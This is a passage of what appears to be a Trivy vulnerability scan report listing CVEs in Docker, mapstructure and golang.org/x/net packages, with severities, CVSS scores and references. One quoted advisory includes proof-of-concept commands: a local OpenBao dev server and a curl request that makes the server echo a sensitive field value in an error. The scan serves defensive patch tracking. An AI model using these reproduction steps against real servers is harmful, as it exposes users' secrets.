│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42306 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:ce8eaa083062e2cb47f72c9ad56421ff40b51a96bcbbd2410f72e04e5fa8579d 
│     │      ├ Title           : Moby is an open source container framework. In Docker Engine prior to  ... 
│     │      ├ Description     : Moby is an open source container framework. In Docker Engine prior to version
│     │      │                   29.5.1, Docker Daemon versions 28.5.2 and prior, and Moby Daemon prior to
│     │      │                   version 2.0.0-beta.14, a race condition during docker cp mount setup allows a
│     │      │                   malicious container to redirect a bind mount target to an arbitrary host path,
│     │      │                    potentially overwriting host files or causing denial of service. This issue
│     │      │                   has been patched in Docker Engine version 29.5.1 and Moby Daemon version
│     │      │                   2.0.0-beta.14. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-61 
│     │      │                  ╰ [1]: CWE-367 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ├ nvd   : 3 
│     │      │                  ╰ photon: 3 
│     │      ├ CVSS             ╭ ghsa ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:N/I:H/A:H 
│     │      │                  │      ╰ V3Score : 7.2 
│     │      │                  ╰ nvd  ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:N/I:H/A:H 
│     │      │                         ╰ V3Score : 7.2 
│     │      ├ References       ╭ [0]: https://github.com/moby/moby 
│     │      │                  ├ [1]: https://github.com/moby/moby/security/advisories/GHSA-rg2x-37c3-w2rh 
│     │      │                  ╰ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-42306 
│     │      ├ PublishedDate   : 2026-06-12T19:16:27.49Z 
│     │      ╰ LastModifiedDate: 2026-06-17T10:47:39.96Z 
│     ├ [4]  ╭ VulnerabilityID : CVE-2026-33997 
│     │      ├ VendorIDs        ─ [0]: GHSA-pxq6-2prw-chj9 
│     │      ├ PkgID           : github.com/docker/docker@v28.0.4+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.0.4%2Bincompatible 
│     │      │                  ╰ UID : 55fb5abb1612e962 
│     │      ├ InstalledVersion: v28.0.4+incompatible 
│     │      ├ FixedVersion    : 29.3.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33997 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:43817dae02fc730d349816a63359b7114fa8f2dc3269f80334f1a6025287252d 
│     │      ├ Title           : moby: docker: github.com/moby/moby: Moby: Privilege validation bypass during
│     │      │                   plugin installation 
│     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
│     │      │                   security vulnerability has been detected that allows plugins privilege
│     │      │                   validation to be bypassed during docker plugin install. Due to an error in the
│     │      │                    daemon's privilege comparison logic, the daemon may incorrectly accept a
│     │      │                   privilege set that differs from the one approved by the user. Plugins that
│     │      │                   request exactly one privilege are also affected, because no comparison is
│     │      │                   performed at all. This issue has been patched in version 29.3.1. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ╭ [0]: CWE-193 
│     │      │                  ╰ [1]: CWE-266 
│     │      ├ VendorSeverity   ╭ amazon: 2 
│     │      │                  ├ ghsa  : 2 
│     │      │                  ├ nvd   : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 6.8 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 8.1 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H 
│     │      │                           ╰ V3Score : 8.4 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:21769 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:22347 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:23345 
│     │      │                  ├ [3] : https://access.redhat.com/security/cve/CVE-2026-33997 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2453277 
│     │      │                  ├ [5] : https://docs.docker.com/engine/extend/legacy_plugins 
│     │      │                  ├ [6] : https://github.com/moby/moby 
│     │      │                  ├ [7] : https://github.com/moby/moby/commit/f4d6f25bf0c3fa12d4968320a4568594775
│     │      │                  │       6a22a 
│     │      │                  ├ [8] : https://github.com/moby/moby/releases/tag/docker-v29.3.1 
│     │      │                  ├ [9] : https://github.com/moby/moby/security/advisories/GHSA-pxq6-2prw-chj9 
│     │      │                  ├ [10]: https://nvd.nist.gov/vuln/detail/CVE-2026-33997 
│     │      │                  ├ [11]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-33997
│     │      │                  │       .json 
│     │      │                  ╰ [12]: https://www.cve.org/CVERecord?id=CVE-2026-33997 
│     │      ├ PublishedDate   : 2026-03-31T03:15:57.523Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:41.643Z 
│     ├ [5]  ╭ VulnerabilityID : CVE-2026-41568 
│     │      ├ VendorIDs        ─ [0]: GHSA-vp62-88p7-qqf5 
│     │      ├ PkgID           : github.com/docker/docker@v28.0.4+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.0.4%2Bincompatible 
│     │      │                  ╰ UID : 55fb5abb1612e962 
│     │      ├ InstalledVersion: v28.0.4+incompatible 
│     │      ├ Status          : affected 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41568 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:79242867ccee5e1ec88803153dbb16f1db90f34ade9aca53eef24751fcd0024f 
│     │      ├ Title           : github.com/docker/docker: github.com/moby/moby: Moby: Denial of Service via
│     │      │                   race condition in docker cp mount setup 
│     │      ├ Description     : Moby is an open source container framework. In Docker Engine prior to version
│     │      │                   29.5.1, Docker Daemon versions 28.5.2 and prior, and Moby Daemon prior to
│     │      │                   version 2.0.0-beta.14, a race condition during docker cp mount setup allows a
│     │      │                   malicious container to create empty files or directories at arbitrary absolute
│     │      │                    paths on the host filesystem. This issue has been patched in Docker Engine
│     │      │                   version 29.5.1 and Moby Daemon version 2.0.0-beta.14. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ╭ [0]: CWE-81 
│     │      │                  ╰ [1]: CWE-367 
│     │      ├ VendorSeverity   ╭ ghsa  : 2 
│     │      │                  ╰ redhat: 1 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:N/I:L/A:H 
│     │      │                  │        ╰ V3Score : 6 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:N/I:L/A:L 
│     │      │                           ╰ V3Score : 3.9 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-41568 
│     │      │                  ├ [1]: https://github.com/moby/moby 
│     │      │                  ├ [2]: https://github.com/moby/moby/security/advisories/GHSA-vp62-88p7-qqf5 
│     │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-41568 
│     │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-41568 
│     │      ├ PublishedDate   : 2026-06-12T19:16:26.907Z 
│     │      ╰ LastModifiedDate: 2026-06-17T10:46:51.787Z 
│     ├ [6]  ╭ VulnerabilityID : CVE-2025-11065 
│     │      ├ VendorIDs        ─ [0]: GHSA-2464-8j7c-4cjm 
│     │      ├ PkgID           : github.com/go-viper/mapstructure/v2@v2.2.1 
│     │      ├ PkgName         : github.com/go-viper/mapstructure/v2 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/go-viper/mapstructure/v2@v2.2.1 
│     │      │                  ╰ UID : 1b295759ac036b69 
│     │      ├ InstalledVersion: v2.2.1 
│     │      ├ FixedVersion    : 2.4.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-11065 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:a1c7c1b0b8b96ff3fe29fc40646d47f90310158d7dc0f8c2d26e831749c9f7d1 
│     │      ├ Title           : github.com/go-viper/mapstructure/v2: Go-viper's mapstructure May Leak
│     │      │                   Sensitive Information in Logs in github.com/go-viper/mapstructure 
│     │      ├ Description     : A flaw was found in github.com/go-viper/mapstructure/v2, in the field
│     │      │                   processing component using mapstructure.WeakDecode. This vulnerability allows
│     │      │                   information disclosure through detailed error messages that may leak sensitive
│     │      │                    input values via malformed user-supplied data processed in security-critical
│     │      │                   contexts. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-209 
│     │      ├ VendorSeverity   ╭ amazon     : 2 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ cbl-mariner: 2 
│     │      │                  ├ ghsa       : 2 
│     │      │                  ╰ redhat     : 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N 
│     │      │                  │        ╰ V3Score : 5.3 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N 
│     │      │                           ╰ V3Score : 5.3 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-11065 
│     │      │                  ├ [1]: https://bugzilla.redhat.com/show_bug.cgi?id=2391829 
│     │      │                  ├ [2]: https://github.com/go-viper/mapstructure 
│     │      │                  ├ [3]: https://github.com/go-viper/mapstructure/commit/742921c9ba2854d27baa6427
│     │      │                  │      2487fc5075d2c39c 
│     │      │                  ├ [4]: https://github.com/go-viper/mapstructure/security/advisories/GHSA-2464-8
│     │      │                  │      j7c-4cjm 
│     │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2025-11065 
│     │      │                  ├ [6]: https://pkg.go.dev/vuln/GO-2025-3900 
│     │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-11065 
│     │      ├ PublishedDate   : 2026-01-26T20:16:06.84Z 
│     │      ╰ LastModifiedDate: 2026-06-30T00:16:51.197Z 
│     ├ [7]  ╭ VulnerabilityID : GHSA-fv92-fjc5-jj9h 
│     │      ├ PkgID           : github.com/go-viper/mapstructure/v2@v2.2.1 
│     │      ├ PkgName         : github.com/go-viper/mapstructure/v2 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/go-viper/mapstructure/v2@v2.2.1 
│     │      │                  ╰ UID : 1b295759ac036b69 
│     │      ├ InstalledVersion: v2.2.1 
│     │      ├ FixedVersion    : 2.3.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://github.com/advisories/GHSA-fv92-fjc5-jj9h 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:1198fcc54edee47d12aa1915c60837de1e2fcd94aed929b0c56dc8547e44acc2 
│     │      ├ Title           : mapstructure May Leak Sensitive Information in Logs When Processing Malformed
│     │      │                   Data 
│     │      ├ Description     : ### Summary
│     │      │                   
│     │      │                   Use of this library in a security-critical context may result in leaking
│     │      │                   sensitive information, if used to process sensitive fields.
│     │      │                   ### Details
│     │      │                   OpenBao (and presumably HashiCorp Vault) have surfaced error messages from
│     │      │                   `mapstructure` as follows:
│     │      │                   https://github.com/openbao/openbao/blob/98c3a59c040efca724353ca46ca79bd5cdbab9
│     │      │                   20/sdk/framework/field_data.go#L43-L50
│     │      │                   ```go
│     │      │                   			_, _, err := d.getPrimitive(field, schema)
│     │      │                   			if err != nil {
│     │      │                   				return fmt.Errorf("error converting input for field %q: %w", field, err)
│     │      │                   			}
│     │      │                   ```
│     │      │                   where this calls `mapstructure.WeakDecode(...)`:
│     │      │                   20/sdk/framework/field_data.go#L181-L193
│     │      │                   func (d *FieldData) getPrimitive(k string, schema *FieldSchema) (interface{},
│     │      │                   bool, error) {
│     │      │                   	raw, ok := d.Raw[k]
│     │      │                   	if !ok {
│     │      │                   		return nil, false, nil
│     │      │                   	}
│     │      │                   	switch t := schema.Type; t {
│     │      │                   	case TypeBool:
│     │      │                   		var result bool
│     │      │                   		if err := mapstructure.WeakDecode(raw, &result); err != nil {
│     │      │                   			return nil, false, err
│     │      │                   		}
│     │      │                   		return result, true, nil
│     │      │                   Notably, `WeakDecode(...)` eventually calls one of the decode helpers, which
│     │      │                   surfaces the original value:
│     │      │                   https://github.com/go-viper/mapstructure/blob/1a66224d5e54d8757f63bd66339cf764
│     │      │                   c3292c21/mapstructure.go#L679-L686
│     │      │                   c3292c21/mapstructure.go#L726-L730
│     │      │                   c3292c21/mapstructure.go#L783-L787
│     │      │                   & more.
│     │      │                   ### PoC
│     │      │                   To reproduce with OpenBao:
│     │      │                   $ podman run -p 8300:8300 openbao/openbao:latest server -dev
│     │      │                   -dev-root-token-id=root -dev-listen-address=0.0.0.0:8300
│     │      │                   and in a new tab:
│     │      │                   $ BAO_TOKEN=root BAO_ADDR=http://localhost:8300 bao auth enable userpass
│     │      │                   Success! Enabled userpass auth method at: userpass/
│     │      │                   $ curl -X PUT -H "X-Vault-Request: true" -H "X-Vault-Token: root" -d
│     │      │                   '{"password":{"asdf":"my-sensitive-value"}}'
│     │      │                   "http://localhost:8300/v1/auth/userpass/users/adsf"
│     │      │                   {"errors":["error converting input for field \"password\": '' expected type
│     │      │                   'string', got unconvertible type 'map[string]interface {}', value:
│     │      │                   'map[asdf:my-sensitive-value]'"]}
│     │      │                   ### Impact
│     │      │                   This is an information disclosure bug with little mitigation. See
│     │      │                   https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-infor
│     │      │                   mation-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin/7471
│     │      │                   7 for a previous version. That version was fixed, but this is in the second
│     │      │                   part of that error message (starting at `'' expected a map, got 'string'` --
│     │      │                   when the field type is `string` and a `map` is provided, we see the above
│     │      │                   information leak -- the previous example had a `map` type field with a
│     │      │                   `string` value provided).
│     │      │                   This was rated 4.5 Medium by HashiCorp in the past iteration. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ VendorSeverity   ─ ghsa: 2 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N 
│     │      │                         ╰ V3Score : 5.3 
│     │      ├ References       ╭ [0]: https://github.com/go-viper/mapstructure 
│     │      │                  ╰ [1]: https://github.com/go-viper/mapstructure/security/advisories/GHSA-fv92-f
│     │      │                         jc5-jj9h 
│     │      ├ PublishedDate   : 2025-06-27T16:24:59Z 
│     │      ╰ LastModifiedDate: 2025-06-27T16:24:59Z 
│     ├ [8]  ╭ VulnerabilityID : CVE-2026-25681 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5029 
│     │      ├ PkgID           : golang.org/x/net@v0.37.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.37.0 
│     │      │                  ╰ UID : 5b14e468f8bbca73 
│     │      ├ InstalledVersion: v0.37.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25681 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:a5a653b5b14ce2288e33fbf263aa6b4137b0502ed6da640071c25e536ffc001c 
│     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Arbitrary code execution via
│     │      │                   Cross-Site Scripting 
│     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
│     │      │                   unexpected HTML tree. This can be leveraged to execute XSS attacks in
│     │      │                   applications that attempt to sanitize input HTML before rendering. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-1021 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.1 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37123 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-25681 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2480680 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2480681 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2480685 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/2480688 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/2480757 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/2480761 
│     │      │                  ├ [8] : https://bugzilla.redhat.com/2493620 
│     │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
│     │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480684 
│     │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
│     │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
│     │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
│     │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
│     │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
│     │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25681 
│     │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27136 
│     │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
│     │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39830 
│     │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
│     │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
│     │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
│     │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-57231 
│     │      │                  ├ [25]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
│     │      │                  ├ [26]: https://errata.rockylinux.org/RLSA-2026:37072 
│     │      │                  ├ [27]: https://go.dev/cl/781703 
│     │      │                  ├ [28]: https://go.dev/issue/79574 
│     │      │                  ├ [29]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [30]: https://linux.oracle.com/cve/CVE-2026-25681.html 
│     │      │                  ├ [31]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
│     │      │                  ├ [32]: https://nvd.nist.gov/vuln/detail/CVE-2026-25681 
│     │      │                  ├ [33]: https://pkg.go.dev/vuln/GO-2026-5029 
│     │      │                  ╰ [34]: https://www.cve.org/CVERecord?id=CVE-2026-25681 
│     │      ├ PublishedDate   : 2026-05-22T16:16:19.863Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [9]  ╭ VulnerabilityID : CVE-2026-27136 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5030 
│     │      ├ PkgID           : golang.org/x/net@v0.37.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.37.0 
│     │      │                  ╰ UID : 5b14e468f8bbca73 
│     │      ├ InstalledVersion: v0.37.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27136 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:11c62c26ebb25b2f6f77193b7e33fd007d72270ae0c0665d27526ccfad03312a 
│     │      ├ Title           : golang.org/x/net/html: golang: golang.org/x/net/html: Cross-Site Scripting via
│     │      │                    HTML parsing bypass 
│     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
│     │      │                   unexpected HTML tree. This can be leveraged to execute XSS attacks in
│     │      │                   applications that attempt to sanitize input HTML before rendering. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-1021 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.1 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37123 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-27136 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2480680 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2480681 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2480685 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/2480688 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/2480757 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/2480761 
│     │      │                  ├ [8] : https://bugzilla.redhat.com/2493620 
│     │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
│     │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480684 
│     │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
│     │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
│     │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
│     │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
│     │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
│     │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25681 
│     │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27136 
│     │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
│     │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39830 
│     │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
│     │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
│     │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
│     │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-57231 
│     │      │                  ├ [25]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
│     │      │                  ├ [26]: https://errata.rockylinux.org/RLSA-2026:37072 
│     │      │                  ├ [27]: https://go.dev/cl/781685 
│     │      │                  ├ [28]: https://go.dev/issue/79575 
│     │      │                  ├ [29]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [30]: https://linux.oracle.com/cve/CVE-2026-27136.html 
│     │      │                  ├ [31]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
│     │      │                  ├ [32]: https://nvd.nist.gov/vuln/detail/CVE-2026-27136 
│     │      │                  ├ [33]: https://pkg.go.dev/vuln/GO-2026-5030 
│     │      │                  ╰ [34]: https://www.cve.org/CVERecord?id=CVE-2026-27136 
│     │      ├ PublishedDate   : 2026-05-22T16:16:20.087Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [10] ╭ VulnerabilityID : CVE-2026-33814 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4918 
│     │      ├ PkgID           : golang.org/x/net@v0.37.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.37.0 
│     │      │                  ╰ UID : 5b14e468f8bbca73 
│     │      ├ InstalledVersion: v0.37.0 
│     │      ├ FixedVersion    : 0.53.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:c80e5b02d71d9faa25b3cebbd39a933ecf415370c93ae5af951feac9c820d6f9 
│     │      ├ Title           : net/http/internal/http2: golang: golang.org/x/net: Go HTTP/2: Denial of
│     │      │                   Service via malformed SETTINGS_MAX_FRAME_SIZE frame 
│     │      ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop
│     │      │                   of writing CONTINUATION frames if it receives a SETTINGS_MAX_FRAME_SIZE with a
│     │      │                    value of 0. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-835 
│     │      │                  ╰ [1]: CWE-606 
│     │      ├ VendorSeverity   ╭ amazon     : 3 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ nvd        : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ photon     : 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ ubuntu     : 2 
